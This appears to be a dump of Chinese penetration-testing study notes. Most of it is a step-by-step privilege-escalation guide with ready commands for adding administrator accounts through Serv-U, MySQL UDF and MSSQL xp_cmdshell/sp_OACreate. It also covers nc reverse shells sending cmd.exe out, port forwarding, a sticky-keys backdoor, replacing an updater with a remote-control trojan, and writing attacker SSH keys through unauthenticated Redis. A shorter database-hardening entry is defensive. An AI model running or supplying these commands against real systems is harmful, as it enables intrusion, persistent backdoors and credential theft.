mysql服务已经被降权运行了如何判断服务器上是否开启了mysql服务？开了3306端口，有的管理员会把默认端口改掉.另一个判断方法就是网站是否支持php,一般支持的话都是用mysql数据库的.如何查看root密码？在mysql的安装目录下找到user.myd这个文件，root就藏在里面，一般是40位cmd加密，一些php网站安装的时候用的是root用户,在conn.asp config.asp这些文件里。有时会显得很乱，这时就需要自己去组合，前17位在第一行可以找到，还有23位在第三行或是其他行，自己继续找。可以直接用php脚本里“mysql执行”，或是上传个UDF.php，如果网站不支持PHP，可以去旁一个php的站，也可以把UDF.php上传到别的phpshell上也可以。填入帐号密码之后，自然就是安装DLL了，点击“自动安装Mysql BackDoor” 显示导出跟创建函数成功后，紧接着执行增加用户的命令即可。注意：5.0版本以下(包括5.0的)默认c:windows系统目录就可以了，5.1版本以上的不能导出到系统目录下创建自定义函数，只能导出在mysql安装目录下的lib/plugin目录中例如：D:/Program Files/MySQL/MySQL Server 5.1/lib/plugin/mysql.dll如果密码看不见，或是组合不到40位，就本地安装一个mysql吧，1、停止mysql服务2、替换下载下来的3个文件（user.MYI user.MYD user.frm）3、cmd切换到bin目录下，进入mysql安全模式，cmd命令：mysqld-nt –skip-grant-tables4、重新打开一个cmd 切换到bin目录下，cmd命令：mysql -u root 版本不同有可能是：mysql -uroot -proot5、最后查询一下就出来了select user,password from mysql.user; serv-u提权 –ftp–windows12345678910111213141516171819202122232425262728293031323334这个文件里包含serv-u的md5密码：C:Program FilesRhinoSoft.comServ-U\\ServUDaemon.ini找到这个文件：ServUDaemon.ini 打开找到：LocalSetupPassword=nqFCE64E0056362E8FCAF813094EC39BC2再拿md5密文去解密，再用现在的密码登陆提权即可。serv-u提权的前提是43958端口开了，且知道帐号密码！如果帐号密码默认，直接用shell里面的serv-u提权功能即可搞定，建议用aspx马、php马去提权，因为可以看回显。530说明密碼不是默认的,回显330说明成功，900说明密码是默认的……………..在程序里找个快捷方式，或是相关的文件进行下载到本地，再查看文件的属性，就可以找到serv-u的安装目录了。目录有修改权限之serv-u提权：找到serv-u的目录，再找到用户的配置文件ServUDaemon.ini，直接增加一个用户代码，保存！接着本地cmd命令：ftp 服务器ip回车，输入帐号密码再回车………………….接着先试试普通的cmd命令提权，不行的话就使用ftp提权的命令：Quote site exec net user jianmei daxia /add 增加一个用户Quote site exec net localgroup administrators jianmei /add 提升到管理员权限200 EXEC command successful (TID=33). 执行成功的回显信息Maintenance=System 权限类型多加一行指定新加帐号为系统管理员ReloadSettings=True 在修改ini文件后需加入此项，这时serv-u会自动刷新配置文件并生效 **端口转发 **1234567891011121314151617181920什么情况下适合转发端口？1.服务器是内网，我们无法连接。2.服务器上有防火墙，阻断我们的连接。转发端口的前提，我们是外网或是有外网服务器。找个可读可写目录上传lcx.exe本地cmd命令：lcx.exe -listen 1988 4567 （监听本地1988端口并转发到4567端口）接着shell命令：/c c:windowstempcookieslcx.exe -slave 本机ip 1988 服务器ip 3389 （把服务器3389端口转发到本地4567端口）之后本地连接：127.0.0.1:4567 (如果不想加上:4567的话，本地执行命令的时候，把4567换成3389来执行就行了)以上是本机外网情况下操作，接着说下在外网服务器里如何操作：上传lxc.exe cmd.exe到服务器且同一目录，执行cmd.exe命令：lcx.exe -listen 1988 4567接着在aspxshell里点击端口映射，远程ip改为站点的ip，远端口程填1988，点击映射端口，接着在服务器里连接127.0.0.1:4567就可以了。 **nc反弹提权 **123456789101112131415161718192021222324252627282930313233343536当可以执行net user，但是不能建立用户时，就可以用NC反弹提权试下，特别是内网服务器，最好用NC反弹提权。不过这种方法, 只要对方装了防火墙, 或是屏蔽掉了除常用的那几个端口外的所有端口，那么这种方法也失效了….找个可读可写目录上传nc.exe cmd.exe-l 监听本地入栈信息-p port打开本地端口-t 以telnet形式应答入栈请求-e 程序重定向本地cmd执行：nc -vv -l -p 52 进行反弹接着在shell里执行命令：c:windowstempnc.exe -vv 服务器ip 999 -e c:windowstempcmd.exe 最好是80或8080这样的端口，被防火墙拦截的几率小很多执行成功后本地cmd命令：cd/ （只是习惯而已）接着以telnet命令连接服务器：telnet 服务器ip 999回车出现已选定服务器的ip就说明成功了，接着权限比较大了，尝试建立用户！坏蛋：本地cmd执行：nc -vv -l -p 52 进行反弹c:windowstempnc.exe -e c:windowstempcmd.exe 服务器ip 52低调小飞：shell执行命令c:windowstempnc.exe -l -p 110 -t -e c:windowstempcmd.exe一般这样的格式执行成功率很小，不如直接在cmd那里输入：c:windowstempnc.exe 命令这里输入：-vv 服务器ip 999 -e c:windowstempcmd.exe这个技巧成功率比上面那个大多了，不单单是nc可以这样，pr这些提权exp也是可以的。 星外提权 –windows1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495如何知道是不是星外主机？第一：网站物理路径存在“freehost”第二：asp马里点击程序，存在“7i24虚拟主机管理平台”“星外主机”之类的文件夹默认帐号：freehostrunat默认密码：fa41328538d7be36e83ae91a78a1b16f!7freehostrunat这个用户是安装星外时自动建立的，已属于administrators管理组，而且密码不需要解密，直接登录服务器即可星外常写目录：C:RECYCLERC:windowstempe:recyclerf:recyclerC:phpPEARC:WINDOWS7i24.comFreeHostC:phpdevC:System Volume Information C:7i24.comserverdoctorlogC:WINDOWSTempc:windowshchiblis.ibl C:7i24.comiissafelog C:7i24.comLinkGatelog C:Program FilesThunder NetworkThunder7C:Program FilesThunder NetworkThunderC:Program FilesSymantec AntiVirusSAVRTc:windowsDriverPacksCAM2C:Program FilesFlashFXPc:Program FilesMicrosoft SQL Server90SharedErrorDumpsC:Program FilesZendZendOptimizer-3.3.0 C:Program FilesCommon Filesc:Documents and SettingsAll UsersApplication DataHagel TechnologiesDU Meterlog.csvc:Program Files360360SafedeepscanSectionmutex.dbc:Program FilesHeliconISAPI_Rewrite3error.logc:Program FilesHeliconISAPI_Rewrite3Rewrite.log c:Program FilesHeliconISAPI_Rewrite3httpd.conf c:Program FilesCommon FilesSymantec SharedPersist.bak c:Program FilesCommon FilesSymantec SharedValidate.dat c:Program FilesCommon FilesSymantec SharedValidate.dat C:Program FilesZendZendOptimizer-3.3.0docsC:Documents and SettingsAll UsersDRMC:Documents and SettingsAll UsersApplication DataMcAfeeDesktopProtectionC:Documents and SettingsAll UsersApplication Data360safesoftmgrC:Program FilesZendZendOptimizer-3.3.0libOptimizer-3.3.0php-5.2.xZendOptimizer.dll C:Documents and SettingsAll UsersApplication DataMicrosoftMedia Indexee提权法：找个可读可写目录上传ee.execmd命令：/c c:windowstempcookiesee.exe -i （获取星外帐号的id值，例如回显：FreeHost ID：724）接着命令：/c c:windowstempcookiesee.exe -u 724 （获取星外的帐号密码）vbs提权法：找个可读可写目录上传cscript.exe iispwd.vbscmd命令：/c “c:windowstempcookiescscript.exe” c:windowstempcookiesiispwd.vbs意思是读取iis，这样一来，不但可以获取星外的帐号密码，还可以看到同服务器上的所有站点的目录。可行思路大全：经测试以下目录中的文件权限均为everyone，可以修改，可以上传同文件名替换，删除，最重要的是还可以执行：360杀毒db文件替换:c:Program Files360360SDdeepscanSectionmutex.db c:Program Files360360SafedeepscanSectionmutex.db C:Program Files360360SafeAntiSectionmutex.dbIISrewrite3 文件替换：C:Program FilesHeliconISAPI_Rewrite3Rewrite.logC:Program FilesHeliconISAPI_Rewrite3httpd.confC:Program FilesHeliconISAPI_Rewrite3error.log诺顿杀毒文件替换:c:Program FilesCommon FilesSymantec SharedPersist.bak c:Program FilesCommon FilesSymantec SharedValidate.dat c:Program FilesCommon FilesSymantec SharedPersist.Dat一流过滤相关目录及文件： C:7i24.comiissafelogstartandiischeck.txt C:7i24.comiissafelogscanlog.htm其他:Zend文件替换：C:Program FilesZendZendOptimizer-3.3.0libOptimizer-3.3.0php-5.2.xZendOptimizer.dll华盾文件替换：C:WINDOWShchiblis.iblFlash文件替换：C:WINDOWSsystem32MacromedFlashFlash10q.ocxDU Meter流量统计信息日志文件替换：c:Documents and SettingsAll UsersApplication DataHagel TechnologiesDU Meterlog.csv 360提权 –windows1234567891011121314找个可读可写目录上传360.execmd命令：/c c:windowstempcookies360.exe会提示3段英文：360 Antivirus Privilege Escalation Exploit By friddy 2010.2.2You will get a Shift5 door!Shift5 Backdoor created! 这是成功的征兆，接着连接服务器连按5下shift键，将弹出任务管理器，点击新建任务：explorer.exe 会出现桌面，接下来大家都会弄了…… 搜狗提权 –windows123搜狗的目录默认是可读可写的，搜狗每隔一段时间就会自动升级，而升级的文件是pinyinup.exe我们只要把这个文件替换为自己的远控木马，或是添加账户的批处理，等搜狗升级的时候，就可以达成我们的目的了。 华众虚拟主机提权 –windows12345678910111213就经验来说，一般溢出提权对虚拟主机是无果的，而且华众又没有星外那么明显的漏洞。所以华众提权关键之处就是搜集信息，主要注册表位置：HKEY_LOCAL_MACHINESOFTWAREHZHOSTCONFIGHKEY_LOCAL_MACHINEsoftwarehzhostconfigsettingsmysqlpass root密码HKEY_LOCAL_MACHINEsoftwarehzhostconfigsettingsmssqlpss sa 密码c:windowstemp 下有hzhost主机留下的ftp登陆记录有用户名和密码以上信息配合hzhosts华众虚拟主机系统6.x 破解数据库密码工具使用百度搜索：hzhosts华众虚拟主机系统6.x 破解数据库密码工具 N点虚拟主机 –windows12345678910111213N点虚拟主机管理系统默认数据库地址为：host_date#host # date#.mdbrl直接输入不行 这里咱们替换下 #=# 空格=修改后的下载地址为/host_date/#host # date#196.mdbN点数据库下载之后找到sitehost表 FTPuser&amp;FTPpass 值 FTPpass是N点加密数据然后用N点解密工具解密得到FTP密码N点默认安装路径C:Program FilesNpointSoftnpointhostwebD:Program FilesNpointSoftnpointhostweb默认权限可读。遇到对方所用虚拟主机是N点时候 可以考虑 读取该文件夹下载数据库N点解密工具代码 提权思路123456提权Webshell：尽量能够获取webshell，如果获取不到webshell可以在有文件上传的地方上传反弹shell脚本；或者利用漏洞（系统漏洞，服务器漏洞，第三方软件漏洞，数据库漏洞）来获取shell。 反弹shell：利用kali虚拟机msfVENOM编写反弹shell脚本 被控制端发起的shell---通常用于被控制端因防火墙受限，权限不足、端口被占用 开启监听：msfconsole模块监听响应的反弹shell脚本（当靶机点击脚本的时候），进入meterpreter模块，可以getsystem权限，获取信息等等，还可以开启远程服务功能（lcx，scocks5） Windows系统漏洞提权思路1234567891011121314151617181920windows(可执行文件：一种是.com；另一种.exe) 系统溢出漏洞操作说明1、明确漏洞编号及版本2、明确漏洞利用平台及版本3、确保cmd执行权限正常运行4、确保服务器相关防护软件情况查看系统补丁，提权前期准备【前提已获取webshell】方法一：输入shell进入到该主机的shell下，然后：systeminfo 查看系统详细信息方法二：进入到 meterpreter 下，执行 run post/windows/gather/enum_patches 可以直接查看补丁情况方法三：post/multi/recon/local_exploit_suggester 模块，用于快速识别系统中可能被利用的漏洞方法四：WMIC命令也可以查看补丁数量wmic qfe get Caption,Description,HotFixID,InstalledOn也可以直接找是否存在某个cve-2018-8120对应的KB4131188补丁wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB4131188&quot;方法五：Windows Exploit Suggester该工具可以将系统中已经安装的补丁程序与微软的漏洞数据库进行比较，并可以识别可能导致权限提升的漏洞，而其只需要目标系统的信息。通过msf生成反弹exe进行反弹操作，获取meterpreter通道监听获取成功后，进行exp的筛选探测可提取的模块use post/multi/recon/local_exploit_suggester linux系统提权思路12345678910111213141516171819202122232425262728293031323334353637383940414243**linux基础信息收集**uname -a 显示全部系统信息cat /etc/issue 内核信息。此命令也适用于所有的Linux发行版cat /etc/passwd 所有人都可看ps aux | grep root**(1)#内核漏洞提权**方法：通过信息收集方式得知linux内核版本使用searchspolit搜索相应版本漏洞例：searchsploit linux 4.0.0searchsploit Ubuntu 16.04searchsploit Ubuntu 16 kernel 3.10找到对应的.c源文件,将其发送到靶机/或是靶机下载 scp， wget http://127.0.0.1/xx.c编译，gcc xxx.c -o exp**(2)#SUID提权**概念SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。特点SUID 权限仅对二进制程序有效执行者对于该程序需要有可执行权限(x权限)SUID 权限仅仅在程序执行过程中有效执行该程序时，执行者将具有该程序拥有者的权限首先在本地查找符合条件的文件，有以下三个命令列出来的所有文件都是以root用户权限来执行的，接下来找到可以提权的文件find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\;常用的可用于suid提权的文件Nmap、Vim、find、Bash、More、Less、cp**(3)#nmap提权**较旧版本的Nmap（2.02至5.21）带有交互模式，从而允许用户执行shell命令。因此可以使用交互式控制台来运行具有相同权限的shell。方法一：启动交互模式，使用nmap --interactive!sh #执行之后将提供一个提权后的shell。方法二：Metasploit模块，也可以通过SUID Nmap二进制文件进行提权。exploit/unix/local/setuid_nmap**(4)#find提权**实用程序find用来在系统中查找文件。同时，它也有执行命令的能力。因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。**(5)#sudo提权**sudo命令以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行。sudo 表示 “superuser do”。它允许已验证的用户以其他用户的身份来运行命令。其他用户可以是普通用户或者超级用户。然而，大部分时候我们用它来以提升的权限来运行命令。 数据库提权思路12345678数据库获取网站数据库的账号和密码--通过读取一些数据库配置文件数据库配置文件：命令规则（data、sql、inc、config、conn、database等）--通过mysql数据库的user表数据库安装文件：安装目录下data/mysql/user.mydfrm:描述表结构文件，字段长度myi：索引信息myd：数据库信息文件，存储数据信息 (1)mysql数据库——udf提权123456789101112udf文件:udf(user-defined-function)是mysql得一个拓展接口，也称为用户自定义函数，用户通过自定义函数来实现在mysql中无法方便实现得功能udf文件后缀名: .dll（windows）linux后缀名：.so提权原理已知root账号和密码，利用root权限，创建带有调用cmd函数的“udf.dll”。当我们把udf.dll导出指定文件夹引入mysql时候，其中的调用函数拿出来当作mysql函数来使用注意事项mysql版本小于5.1版本，udf.dll文件在windows2003下放在：c:\\windows\\system32。在windows2000放在：c:\\winnt\\system32mysql版本大于5.1版本，udf.dll文件必须放置在mysql安装目录下的lib\\plugin。但是大于5.1版本的时候没有plugin这个文件夹，需要自己创建。利用udf文件加载函数执行命令create function cmdshell returns string soname &#x27;udf.dll&#x27;; //returns string soname ‘导出的DLL路径’；select cmdshell(&#x27;net user ndsec ndsecpw /add&#x27;);select cmdshell(&#x27;net localgroup administrators ndsec /add&#x27;);drop function cmdshell; (2)#数据库提权——mof提权12345678910mof文件:mof文件是mysql数据库的扩展文件存放路径（C:/windows/system32/wbem/mof/nullevt.mof）其作用是每隔5秒就会去监控进程创建和死亡。提权条件1、windows2003及以下2、mysql启动身份具有权限去读写C:/windows/system32/wbem/mof/目录3、secure-file-priv=不为null提权原理mof文件每5秒就会执行，而且是系统权限，我们可以通过load_file将文件写入/wbme/mof，然后系统每5秒就会执行一次我们上传的mofmof当中是一段vbs脚本，通过通过控制vbs脚本让系统执行命令，进行提权。 (3)#数据库提权——反弹端口提权1234提权条件1、获取数据库的账号和密码，同时能够执行查询命令。2、secure_file_priv=,可导出udf.dll到系统目录或者mysql数据库安装目录下的lib下plugin3、授权mysql数据库远程用户的登录 (4)#数据库提权——启动项提权 (这种方法不推荐) 12345提权原理使用mysql写文件，写一段vbs代码到开启自启动中。服务器重启的时候达到创建用户并提取。可以使用DDOS迫使服务器重启提权条件secure_file_priv不为null已知账号和密码 (5)linux系统-udf提权 12345678910111213141516上传脚本进行监听靶机连接数据库查看版本use mysql;create table foo(line blob);insert into foo values(load_file(&#x27;/tmp/raptor_udf2.so&#x27;));select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;;create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;;select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);find / -exec &quot;/bin/sh&quot; \\;mssql数据库SA权限执行命令存储过程：xp_cmshell、sp_OACreate注册表存储过程：xp_regwrite存储过程其实质就是一个“集合”。它就是存储在sqlserver中预先定义好的“sql语句集合。”使用T-SQL语言编写好的各种小脚本共同组合成的集合体，我们就称为“存储过程” 利用xp_cmdshell提权1234567891011121314151617181920212223242526272829（1）xp_cmdshell解释Xp_cmdshell是sqlserver中的组件，可以以操作系统命令解释器的方式执行给定的命令字符串，并以文本行方式返回任何输出。可以用来执行系统命令（2）xp_cmdshell开启默认在sql server2000中是开启的，在sqlserver2005之后的版本默认禁止。如果我们有sa权限，可以用命令开启exec sp_configure ‘show advanced options’ , 1;reconfigure;exec sp_configure ‘xp_cmdshell’, 1;reconfigure;xp_cmdshell 关闭exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;exec sp_configure &#x27;ole automation procedures&#x27;,0;reconfigure;exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure;（3）当xp_cmdshell删除或出错的情况下，使用sp_OACreate组件开启组件SP_OACreateexec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;exec sp_configure &#x27;ole automation procedures&#x27;,1;reconfigure;关闭组件SP_OACreateexec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;exec sp_configure &#x27;ole automation procedures&#x27;,0;reconfigure;exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure;利用SP_OACreate添加用户提权declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\\windows\\system32\\cmd.exe /c net user quan 123456 /add&#x27;declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\\windows\\system32\\cmd.exe /c net localgroup administrators quan /add&#x27;利用SP_OACreate的其他操作sp_OACreate替换粘贴键declare @o intexec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o outexecsp_oamethod@o,&#x27;copyfile&#x27;,null,&#x27;c:\\windows\\explorer.exe&#x27; ,&#x27;c:\\windows\\system32\\sethc.exe&#x27;;declare @o intexec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o outexecsp_oamethod@o,&#x27;copyfile&#x27;,null,&#x27;c:\\windows\\system32\\sethc.exe&#x27; ,&#x27;c:\\windows\\system32\\dllcache\\sethc.exe&#x27;; 第三方软件提权思路1第三方软件指的是该非线性编辑系统生产商以外的软件公司提供的软件，功能十分强大，有些甚至是从工作站转移过来的，可以这么说，非线性编辑系统之所以能做到效果变幻莫测，匪夷所思，吸引众人的视线，完全取决于第三方软件。第三方软件提权，就是利用第三方软件存在的漏洞来进行获取一个权限的操作。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"后渗透","slug":"渗透测试/后渗透","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"msf","slug":"渗透测试/后渗透/msf","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/msf/"},{"name":"提权","slug":"渗透测试/后渗透/msf/提权","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/msf/%E6%8F%90%E6%9D%83/"}],"tags":[{"name":"msf","slug":"msf","permalink":"http://example.com/tags/msf/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"后渗透","slug":"后渗透","permalink":"http://example.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"提权","slug":"提权","permalink":"http://example.com/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"","slug":"数据库安全检查与加固","date":"2024-02-26T02:25:19.102Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2024/02/26/数据库安全检查与加固/","permalink":"http://example.com/2024/02/26/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E4%B8%8E%E5%8A%A0%E5%9B%BA/","excerpt":"","text":"数据库安全检查与加固1.mysql数据库安全管理 禁止MySQL已管理元的身份账号权限运行 1234用普通账户运行mysqld加固方法： MySQL my.cnf配置文件中配置user=mysql 设置root用户名口令并修改登录名，且不存在空密码账号 12345678910111213141.ccess MySQL控制台： mysql -u root -p在控制台中执行： set password for &#x27;root&#x27;@&#x27;localhost&#x27; = password(&#x27;new_password&#x27;)为了改进root的安全性，可以改名 use mysql; update user set user=&quot;another_username&quot; where user=&quot;root&quot;; flush privileges;然后就可以用新用户名访问 mysql -u another_username -p 2.对于空密码账号 set password for &lt;user&gt;@&#x27;&lt;host&gt;&#x27; = password(&#x27;&lt;clear password&gt;&#x27;) select * from mysql.user where user =&quot;&quot;; 配置合适的密码强度，最常使用期限小于90天 1234567891011密码特征，长度，大小写，长度，字符集添加配置到全局配置 plugin-load=validate_password.so validate_password_length=14 validate_password_mixed_case_count=1 validate_password_number_count=1 validate_password_special_char_count=1 validate_passwordpolicy=MEDIUM使用期限小于等于90天 配置rdbms： set global default_password_lifetime=90 降低用户的数据库特权，只有管理员有完整的数据库访问权限 123456789mysql.user和mysql.db表使用revoke语句来删除权限MySQL.user中权限： file_priv:表示是否运行用户读取数据库所在主机的本地文件; Process:表示是否运行用户查询所有用户的命令执行信息; Super_priv:表示用户是否有设置全局变量、管理员调试等高级权限； Shutdown_priv：表示用户是否可以关闭数据库； Create_user_priv：表示用户是否可以创建或者删除其他用户; Grant_priv:表示用户是否可以修改其他用户权限； 禁止或限制远程访问，确保特定主机才有访问特权 123456789打开主句对数据库的访问： grant all on *.* to &#x27;root&#x27;@&#x27;% &#x27;;这是完全开放了对root 的访问，需要对特定主机ip进行限制 grant all on *.* to &#x27;root&#x27;@&#x27;localhost&#x27;; grant all on *.* to &#x27;root&#x27;@&#x27;myip.athome&#x27;; flush privileges;有限许可访问： grant select,insert on mydb.* to &#x27;someuser&#x27;@&#x27;somehost&#x27;; someuser换成用户名，somehost换成主机 配置MYSQL日志便于审计 12345678910日志默认会用主机名+.err命名的文件配置log_error=/mydata/data/mysql.test.com.err 指定错误日志信息，默认在数据库目录下，该位置必须有写的权限log_warning =&#123;0|1&#125;#默认开启，服务器运行中的警告日志也在其中查询日志log=&#123;ON|OFF&#125; 是否开启查询日志，在MySQL5.6已经废弃general_log =&#123;ON|OFF&#125; 启动或关闭查询日志，默认关闭general_log_file = /mydata/data/mysql.log 指定查询日志的位置log_output = &#123;TABLE|FILE|NONE&#125;指定存放日志位置的位置，文件或者表 删除测试安装的test数据库 1234567 DROP DATABASE &quot;test&quot;8. Mysqld启动禁用“--skip-grant-tables” ~~~markdown skip-grant-tables导致不适用权限系统的情况下启动，不启动grant-tables授权表，忘记管理员密码可以用到 配置文件中skip-grant-tables设置为FALSE，并且启动参数不包含--skip-grant-tables 数据库位于非系统区 12345678系统分区：通常用于主句系统、应用程序操作非系统分区：用于存储数据MySQL数据库的挂在点不应该为：root（&#x27;/&#x27;）,var,/usr为MySQL选择非系统分区的新位置 停止mysqld: service mysql stop 执行命令复制数据： cp-rp &lt;datadir&gt; &lt;新位置&gt; 启动 service mysql start 2.Oracle管理用户安全性1234567创建用户 create user test1 identified by test1;删除用户 drop user test1;锁定用户 alter user test1 account lock; select username,account_status form dba_users where username =&quot;&quot;;修改用户密码 alert user test1 identified by &lt;新密码&gt;; 概要文件 12345678用户限制数据库使用和实例资源的一组指定资源限制的条件，并管理账户状态和口令管理规则。select username,account_status,profile from dba_users where rownum &lt;= 1;select profile,resource_name,limit from dba_profiles where rownum &lt;= 1;profile 配置 口令复杂验证 12345password_verify function 指定一个pl/sql函数，便于分配口令之前执行复杂度检查utlpwdmg.sql脚本提供了模型口令验证函数Unix和linux： $ORACLE_HOME/rdbms/adminwinows: %oracle_home%\\rdbms\\admin 取消概要文件的限制 12345取消密码管理 alert profile DEFAULT limit unlimited; alert profile DEFAULT limit password_reuse_time unlimited;停止密码校验函数 alert profile DEFAULT limit password_verify_function null; 自建概要文件 3.Redis未授权访问漏洞数据库持久，key-value ，list，set，zset，hash，数据备份 漏洞原理（18）123456未开启认证或采用相关策略 默认绑定在679，没有开启认证ssh免密码登录 ssh root@192.168.xxx.xxx 自身提供的config命令，可进行写操作 将攻击者的公钥写入目标服务器 /root/.ssh文件夹的authotrized_keys文件中，然后使用对应的私钥登录 123456789101112131415161718192021222324252627ssh-keygen -t rsa 本地生成公私密钥用户根目录 .sshauthorized_keys存在远程免密登录的公钥，可记录多台id_rsa:生成的私钥文件id_rsa.pub:生成的公钥文件know_hosts: 已知的主机公钥清单希望公钥生效必须满足：1. .ssh目录权限必须为7002. .ssh/authorized_keys 文件必须为600scp复制自己的公钥到对方的文件中 scp -p ~/.ssh/id_rsa.pub root@&lt;remote_ip&gt;:/root/.ssh/authorized_keys 手工复制黏贴到远程服务器~/.ssh/authorized_keysroot@kail: ./redis-cli -h 192.xxx.xxx.xxx192.xxx.xxx.xxx:6379&gt; config get dir192.xxx.xxx.xxx:6379&gt; config get dir /root/.ssh192.xxx.xxx.xxx:6379&gt; config set dbfilename authorized_keys192.xxx.xxx.xxx:6379&gt; keys *192.xxx.xxx.xxx:6379&gt; get xxx &quot;\\n\\n\\nssh-rsa key_pub root@kail\\n\\n\\n\\n&quot;192.xxx.xxx.xxx:6379&gt; savessh ip 登录 redis安全检测1234561.ps -aux|grep redis 是否root运行2.netstat -tunlp|grep redis 是否监听本地3.是否设置相应的密码 redis-cli -h 192.xxxx keys * info 加固 漏洞解决方法12345升级程序，补丁修改安全配置，停止服务通过主机防火墙进行访问控制通过系统边界防火墙进行访问控制通过修改程序Banner进行欺骗","categories":[],"tags":[]},{"title":"渗透测试学习（信息收集）","slug":"渗透测试学习笔记（信息收集）","date":"2024-02-26T02:25:19.098Z","updated":"2022-04-08T17:07:57.310Z","comments":true,"path":"2024/02/26/渗透测试学习笔记（信息收集）/","permalink":"http://example.com/2024/02/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%89/","excerpt":"","text":"渗透测试学习笔记（信息收集）信息收集目的：信息收集作为渗透前期的准备工作扮演着极为重要的角色，我们的 最终目的是拿下目标，那么信息收集的目的就是为拿下目标进行铺路。良好的信息 收集能够更全面的掌握对方情况，并为你下一步的操作起到帮助决策的作用。 这里主要是web的信息收集，即针对web服务器对象的 域名信息1234567891011121314151617181920212223- a. 对应ip收集： i. ping域名 ii. ip138查找历史ip iii. 全国pingb. 子域名收集：（17:35）​ i. Layer子域名挖掘机，subdomain（优先选择版本较低的服务器）​ ii. 自己找个好用的工具和更新字典c. whois（注册人）信息查询：（35:27） ​ ▪ 爱站，站长工具，微步在线，ip138，searchdns.netcraft.com​ ▪ 查找注册人的一些信息，注册日期，注册人姓名，注册人邮箱、电话等，反查其他注册的域名，然后搞别的站寻找密码再回来，或者查询社工信息，查看曾用密码来进行生成字典推测 敏感目录 ​ 收集方向：robots.txt，后台，安装包，上传目录，安装页面，mysql管理接口，phpinfo等 1234a. 字典爆破：御剑，dirbuster，wwwscan等b. 爬行：爬行菜刀，webrobot，burp等 ○ 有的站会有防护，如阿里云的封锁ip，安全狗使扫描器的一堆误报，需要用代理进行访问，用代理池跑○ 扫扫二级目录 段口分析 12345678910111213通过nmap，portscan或其他工具扫一下端口，看一下服务开启常见的端口： i. 21：FTP ii. 22：SSH iii. 23：telnet iv. 25：smtp v. 80：http vi. 443：https vii. 445：smb viii. 1433：sql server ix. 1521：oracle x. 3306：mysql xi. 3389：rdp 旁站c段 12a. 旁站：同服务器的其他站点，一个ip的其他所有域名b. c段：指某个服务器的C段ip地址（即0/24）的所有域名 整站分析 服务器类型 123i. 服务器平台：windows，linux，通过文件大小写来判断，Linux区分大小写，或者看报错信息ii. 服务器版本：nmap探测，报错信息 网站容器 12345678910iis：windows搭建容器，windows2003,2008,2012,2016版本对应iis6.0，iis7.0/7.5，iis8.0，iis10.0apache：一般为linux搭建，如果apache（win32）表示用windows搭建的apache环境，一般为集成环境，如phpstudy，upupw，宝塔nginx：一般为linux搭建，nginx（win32）同上tomcat检测方法：看报错信息，审查元素network查看 脚本类型 123iis一般用asp，aspx，phpapache，nginx一般用phptomcat一般用jsp 数据库类型 1234asp + access，少部分会用sqlserveraspx + sqlserver，少部分用accessphp + mysql，也有用postgresql，oracle不常见jsp + mysql/sqlserver，oracle少一些，金融，大学，证券一般是oracle cms类型(找对应的cms漏洞，进行漏洞利用) 123登录后台网站页脚泄露工具自动化识别 waf 构造一下sql语句，查看网站是否拦截 google黑客 shodan，censys，fofa，钟馗 1234inurl：xxxintitle：xxxsite：filetype URL采集 后台查找总结12345678910111213141516171819202122231.弱口令默认后台： admin，admin/login.asp，manage等 a. discuz，phpv9，phpweb：默认为 admin.php b. 科讯：默认为 admin/login.asp c. 帝国：默认为 e/admin d. aspcms：默认为 admin_aspcms2. 御剑，dirbuster等扫描目录3. 爬行网站（asp/aspx/php）4. robots.txt 查看5. 借助谷歌语法，像dedecms6. 寻找编辑器后台7. 查找关联性信息，像同一个建站商，注册人或者注册邮箱 寻找网站页脚，通过搜索引擎搜索相同建站商，通过上面的方法再找后台，找到后用相同的后台名称去试要测试的站点。8. 博彩，资金盘的站点 a. 高位端口：xxx.com:8888 b. 子域名：admin.xxx.com c. 可能是完全独立的另一个域名 i. 如果是同一个服务器可以查旁站 ii. 不在同一个服务器就打xss d. 查看css样式，js代码9. 